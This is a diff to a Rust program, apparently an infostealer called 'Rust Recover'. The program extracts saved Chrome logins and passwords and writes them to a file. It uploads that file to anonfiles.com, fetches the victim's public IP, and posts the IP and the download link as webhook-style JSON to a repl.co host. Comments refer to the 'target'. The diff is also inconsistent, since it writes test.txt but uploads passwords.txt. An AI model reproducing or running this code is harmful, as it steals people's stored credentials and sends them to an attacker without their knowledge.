@@ -8,7 +8,7 @@ use aes_gcm::{Aes256Gcm, Error};
 use aes_gcm::aead::{Aead, NewAead};
 use aes_gcm::aead::generic_array::GenericArray;
 use reqwest;
-use reqwest::blocking::{Client, multipart};
+use reqwest::blocking::{Client,multipart};
 
 
 //debug for resting :)
@@ -120,16 +120,33 @@ impl Chromepass {
 
 }
 
+fn anon_upload(fpath: &'static str) -> Result<String, reqwest::Error> {
+    let mut file = File::open(fpath).unwrap();
+    let mut contents = Vec::new();
+    file.read_to_end(&mut contents).unwrap();
+
+    let client = Client::new();
+    let form = multipart::Form::new()
+        .part("file", multipart::Part::bytes(contents).file_name(fpath));
+
+    let response = client
+        .post("https://api.anonfiles.com/upload")
+        .multipart(form)
+        .send()?;
+
+    let result: serde_json::Value = response.json()?;
+    let link = result["data"]["file"]["url"]["short"].as_str().unwrap();
+
+    Ok(link.to_string())
+}
 
 //we can use the decryption key later probably
 fn main() {
     //gettings IP of tagert just testing :0
-    let response = reqwest::blocking::get("https://api.ipify.org").unwrap();
-    let ip = response.text().unwrap();
-    print!("{}", ip);
+
     //ok lets load it into a text file 
     let chrome_datap = Chromepass::obtain_data_from_db().unwrap();
-    let mut filep = fs::File::create("passwords.txt").unwrap();
+    let mut filep = fs::File::create("test.txt").unwrap();
     for chrome in chrome_datap {
         let url = if chrome.url.is_empty() { "None".to_owned() } else { chrome.url };
         let login = if chrome.login.is_empty() { "None".to_owned() } else { chrome.login };
@@ -139,16 +156,31 @@ fn main() {
             filep.write_all(line.as_bytes()).unwrap();
         }
     }
-    let mut file = File::open("passwords.txt").unwrap();
-    let mut contents = Vec::new();
-    file.read_to_end(&mut contents).unwrap();
 
-    let form = multipart::Form::new()
-        .part("file", multipart::Part::bytes(contents).file_name("test.txt"));
+    let file_path = "passwords.txt";
+    let plink = anon_upload(file_path).unwrap();
+    let response = reqwest::blocking::get("https://api.ipify.org").unwrap();
+    let ip = response.text().unwrap();
+    let ipmessage = format!("Client IP: {}", ip);
+    let json_data = format!(r#"{{
+        "content": null,
+        "embeds": [
+            {{
+                "description": "```{} ``````Passwords: {}```",
+                "color": null,
+                "author": {{
+                    "name": "Rust Recover"
+                }}
+            }}
+        ],
+        "attachments": []
+    }}"#, ipmessage,plink);
+    
 
     let client = Client::new();
-    let res = client.post("WEBHOOK';")
-        .multipart(form)
+    let res = client.post("https://waterloggedgracefulgeeklog.floppyfish118.repl.co")
+        .body(json_data.to_string())
+        .header("Content-Type", "application/json")
         .send()
         .unwrap();
 
